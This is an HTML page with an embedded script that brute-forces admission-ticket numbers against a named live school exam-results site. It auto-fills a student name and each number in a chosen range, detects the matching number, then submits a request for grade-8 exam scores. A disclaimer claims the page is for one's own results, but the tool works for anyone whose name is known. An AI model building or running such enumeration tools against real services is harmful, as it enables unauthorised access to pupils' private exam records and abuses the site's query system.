<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>信谢开发的</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: "PingFang SC", "Helvetica Neue", sans-serif;
        }
        body {
            background: #000000;
            min-height: 100vh;
            padding: 24px 16px;
            position: relative;
            overflow-x: hidden;
        }
        body::before {
            content: "";
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg,transparent 0%,rgba(255,0,0,0.08),rgba(255,165,0,0.08),rgba(255,255,0,0.08),rgba(0,255,0,0.08),rgba(0,0,255,0.08),rgba(128,0,128,0.08),transparent);
            animation: streamLight 8s linear infinite;
            pointer-events: none;
        }
        @keyframes streamLight {
            0% { transform: translateX(-100%); }
            100% { transform: translateX(100%); }
        }
        h2 {
            text-align: center;
            margin-bottom: 12px;
            color: #ffffff;
            font-size: 22px;
            font-weight: 600;
            text-shadow: 0 0 8px #fff,0 0 16px #fff;
        }
        #status {
            text-align: center;
            font-size: 17px;
            color: #e2e8f0;
            margin-bottom: 20px;
            min-height: 24px;
            transition: all 0.3s ease;
            text-shadow: 0 0 6px #fff;
        }
        #status.success {
            color: #ffffff;
            text-shadow: 0 0 10px #fff,0 0 20px #fff;
        }
        #btn, #openBtn {
            display: block;
            margin: 0 auto 12px auto;
            padding: 12px 36px;
            background: rgba(0,0,0,0.2);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            color: white;
            border-radius: 16px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            animation: borderRain 8s linear infinite;
            box-shadow: 0 0 15px #fff;
            transition: all 0.3s ease;
            text-shadow: 0 0 8px #fff;
        }
        @keyframes borderRain{
            0%{border:1px solid #ff0000;box-shadow:0 0 20px #ff0000;}
            20%{border:1px solid #ff9900;box-shadow:0 0 20px #ff9900;}
            40%{border:1px solid #ffff00;box-shadow:0 0 20px #ffff00;}
            60%{border:1px solid #00ff00;box-shadow:0 0 20px #00ff00;}
            80%{border:1px solid #0066ff;box-shadow:0 0 20px #0066ff;}
            100%{border:1px solid #9900ff;box-shadow:0 0 20px #9900ff;}
        }
        #btn:hover, #openBtn:hover {
            background: rgba(255,255,255,0.05);
            transform: translateY(-2px);
        }
        .glassWrap {
            border-radius: 20px;
            padding: 8px;
            background: rgba(255, 255, 255, 0.08);
            backdrop-filter: blur(16px);
            -webkit-backdrop-filter: blur(16px);
            animation: borderRain 8s linear infinite;
            margin: 0 auto 20px auto;
            max-width: 600px;
        }
        iframe {
            width: 100%;
            height: 600px;
            border: none;
            border-radius: 16px;
            background: #ffffff;
        }
        #rangeModal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.85);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 9999;
        }
        .modal-content {
            background: rgba(30, 30, 30, 0.8);
            backdrop-filter: blur(16px);
            -webkit-backdrop-filter: blur(16px);
            padding: 32px;
            border-radius: 20px;
            width: 320px;
            animation: borderRain 8s linear infinite;
        }
        .modal-content h3 {
            text-align: center;
            margin-bottom: 20px;
            color: #ffffff;
            font-size: 18px;
            font-weight: 600;
            text-shadow: 0 0 8px #fff;
        }
        .modal-content input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border-radius: 12px;
            font-size: 16px;
            background: rgba(255,255,255,0.05);
            color: #e2e8f0;
            outline: none;
            box-shadow: 0 0 6px rgba(255,255,255,0.15) inset;
            transition: all 0.3s ease;
            text-shadow: 0 0 6px #fff;
            animation: borderRain 8s linear infinite;
        }
        .modal-content button {
            width: 100%;
            padding: 12px;
            background: rgba(0,0,0,0.2);
            backdrop-filter: blur(10px);
            color: #fff;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 10px;
            transition: all 0.3s ease;
            text-shadow: 0 0 8px #fff;
            animation: borderRain 8s linear infinite;
        }
        #nameModal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.85);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 9999;
        }
        .agreePop {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.9);
            z-index: 99999;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .agreeBox {
            background: rgba(30, 30, 30, 0.85);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            padding: 40px 32px;
            border-radius: 24px;
            width: 360px;
            text-align: center;
            animation: borderRain 8s linear infinite;
        }
        .agreeBox p {
            color: #e2e8f0;
            font-size: 15px;
            line-height: 2;
            margin-bottom: 32px;
            text-shadow: 0 0 8px #fff;
        }
        .agreeBtn {
            padding: 14px 40px;
            background: rgba(0,0,0,0.2);
            backdrop-filter: blur(12px);
            color: #fff;
            border-radius: 16px;
            cursor: pointer;
            font-size: 16px;
            font-weight: 500;
            transition: all 0.3s ease;
            text-shadow: 0 0 8px #fff;
            animation: borderRain 8s linear infinite;
        }
        .agreeBtn:hover {
            background: rgba(255,255,255,0.05);
            transform: scale(1.05);
        }
    </style>
</head>
<body>
    <div class="agreePop" id="agreePop">
        <div class="agreeBox">
            <p>进此网站仅供查询自己成绩<br>忘记准考证号请勿查询他人成绩<br>任何违法使用行为均与开发者无关</p>
            <button class="agreeBtn" onclick="closeAgree()">同意进入</button>
        </div>
    </div>

    <h2>准考证自动查询:打不开自己去别的地方输准考证:姓谢的搞的</h2>
    <div id="status">等待设置区间...</div>
    <button id="btn" onclick="startBrute()">开始</button>

    <div class="glassWrap">
        <iframe id="frm" src="http://qhsjyj.yhsvr.cn:9999/student/result.html"></iframe>
    </div>

    <button id="openBtn" onclick="quickQuery()">立即查询</button>

    <div id="rangeModal">
        <div class="modal-content">
            <h3>设置区间:</h3>
            <input id="startInput" placeholder="起始准考证号">
            <input id="endInput" placeholder="结束准考证号">
            <button onclick="setRange()">确定</button>
        </div>
    </div>

    <div id="nameModal">
        <div class="modal-content">
            <h3>输入姓名</h3>
            <input id="nameInput" placeholder="请输入你的姓名">
            <button onclick="confirmName()">确定</button>
        </div>
    </div>

<script>
let trueKaoHao = "";
function closeAgree() {
    document.getElementById('agreePop').style.display = 'none';
}

// 立即查询：自动填入正确考号+选八年级+提交
function quickQuery(){
    if(!trueKaoHao) return;
    let frm = document.getElementById('frm');
    let doc = frm.contentDocument || frm.contentWindow.document;
    let inputs = doc.querySelectorAll("input[type='text']");
    if(inputs.length >= 2){
        inputs[0].value = userName;
        inputs[1].value = trueKaoHao;
    }
    let selectBox = doc.querySelector("select");
    if(selectBox){
        for(let i=0;i<selectBox.options.length;i++){
            if(selectBox.options[i].text.includes("八年级期末考试")){
                selectBox.selectedIndex = i;
                break;
            }
        }
    }
    setTimeout(()=>{
        let btn = doc.querySelector("button");
        if(btn) btn.click();
    },200);
}

let startNum = 0;
let endNum = 0;
let userName = "";
let currentNum = 0;
let timer = null;
let lastNum = 0;

function setRange() {
    let s = document.getElementById('startInput').value.trim();
    let e = document.getElementById('endInput').value.trim();
    startNum = parseInt(s);
    endNum = parseInt(e);
    if (isNaN(startNum) || isNaN(endNum)) return;
    if (startNum > endNum) return;
    document.getElementById('rangeModal').style.display = "none";
    document.getElementById('status').innerText = `已设置区间：${startNum} ~ ${endNum}`;
}

function startBrute() {
    if (startNum === 0 || endNum === 0) return;
    document.getElementById('nameModal').style.display = "flex";
}

function confirmName() {
    userName = document.getElementById('nameInput').value.trim();
    if (userName === "") return;
    document.getElementById('nameModal').style.display = "none";
    currentNum = startNum;
    lastNum = 0;
    trueKaoHao = "";
    if(timer)clearInterval(timer);
    timer = setInterval(loop, 600);
}

function loop() {
    if (currentNum > endNum) {
        clearInterval(timer);
        timer = null;
        document.getElementById('status').innerText = "全部遍历完成，未查询到";
        document.getElementById('status').classList.remove('success');
        return;
    }
    lastNum = currentNum;
    let frm = document.getElementById('frm');
    let doc = frm.contentDocument || frm.contentWindow.document;
    let inputList = doc.querySelectorAll("input[type='text']");
    if (inputList.length >= 2) {
        inputList[0].value = userName;
        inputList[1].value = currentNum;
        let submitBtn = doc.querySelector("button");
        if (submitBtn) submitBtn.click();
    }
    document.getElementById('status').innerText = "正在尝试：" + currentNum;
    document.getElementById('status').classList.remove('success');
    setTimeout(() => {
        let text = doc.body.innerText;
        if (text.includes("错误")) return;
        if (text.includes("请选择考试")) {
            clearInterval(timer);
            timer = null;
            trueKaoHao = lastNum - 1;
            document.getElementById('status').innerText = "✅ 成功号码：" + trueKaoHao;
            document.getElementById('status').classList.add('success');
            let selectBox = doc.querySelector("select");
            if (selectBox) {
                for (let i = 0; i < selectBox.options.length; i++) {
                    if (selectBox.options[i].text.includes("八年级期末考试")) {
                        selectBox.selectedIndex = i;
                        break;
                    }
                }
            }
            setTimeout(() => {
                let finalSubmitBtn = doc.querySelector("button");
                if(finalSubmitBtn) finalSubmitBtn.click();
            },200);
        }
    }, 400);
    currentNum++;
}
</script>
</body>
</html>
